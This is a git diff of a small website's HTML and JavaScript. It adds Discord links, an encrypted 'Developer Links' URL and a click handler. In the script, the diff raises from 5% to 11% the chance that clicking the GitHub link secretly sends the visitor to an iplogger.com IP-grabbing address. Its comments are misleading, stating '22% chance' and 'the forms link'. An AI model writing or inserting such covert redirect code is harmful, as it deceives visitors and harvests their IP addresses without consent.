@@ -46,9 +46,24 @@
 
       <!-- Other Placeholder Sections -->
       <div class="placeholder-info">
+
       <div class="placeholder-info">
         <h2>Reach Out</h2>
         <p>Experience the services that set us apart.</p>
+      </div>
+        <div class="placeholder-info">
+      <a id="sLink" href="https://discord.gg/dSQTDq39c" target="_blank">GHPM ads</a>
+      </div>
+      <div class="placeholder-info">
+      <a href="discord" target="_blank">Discord : Sahwe</a>
+      </div>
+
+
+    </div>
+      <div class="placeholder-info">
+      <div class="placeholder-info">
+        <h2>Developer Links</h2>
+        <p>These links are for GHPM developers only.</p>
       </div>
       <div class="placeholder-info">
       <a id="listingsLink" href="https://jstrieb.github.io/link-lock/#eyJ2IjoiMC4wLjEiLCJlIjoiS1hHOXBNWmlOb3dkQVM0R0ZhRDEveDF5K1VGeWJtODdLd2oyQVpXL1htKzl1RTh4eGRMTGVBUnRyelpTRG5LaGM1Rks1RXdMTjB5OVNESUt5cm1XdmlkVjZZV2tVNUVMd1AxMXVxbXRhSGpKMzlybE45dXVvOVdwQjk1and5ZFVMaHh2am5kak55Q2Q0a2lDT0E0UkZzMzh3SzQ9IiwicyI6Ii8vdloxS1ZGeGZ5cE1VOHIwVFB1eVE9PSIsImkiOiJDQ2RPa0hwUXlsanVHQlpEIn0" target="_blank">Listings Page</a>
@@ -160,6 +175,14 @@ document.addEventListener("DOMContentLoaded", function() {
       window.location.href = linkUrl; // Redirect to the link URL
     });
   }
+  const sLink = document.getElementById("sLink");
+  if (sLink) {
+    sLink.addEventListener("click", event => {
+      event.preventDefault(); // Prevent the default link behavior
+      const linkUrl = sLink.getAttribute("href"); // Get the link URL
+      window.location.href = linkUrl; // Redirect to the link URL
+    });
+  }
   const Link = document.getElementById("Link");
   if (Link) {
     Link.addEventListener("click", event => {
@@ -210,7 +233,7 @@ document.addEventListener("DOMContentLoaded", function() {
         const randomPercent = Math.random() * 100;
 
         // 22% chance (redirect if the random number is less than 22)
-        if (randomPercent < 5) {
+        if (randomPercent < 11) {
           githubLink.addEventListener("click", event => {
             event.preventDefault(); // Prevent the default link behavior
             window.location.href = "https://iplogger.com/26Qh95"; // Redirect to the forms link
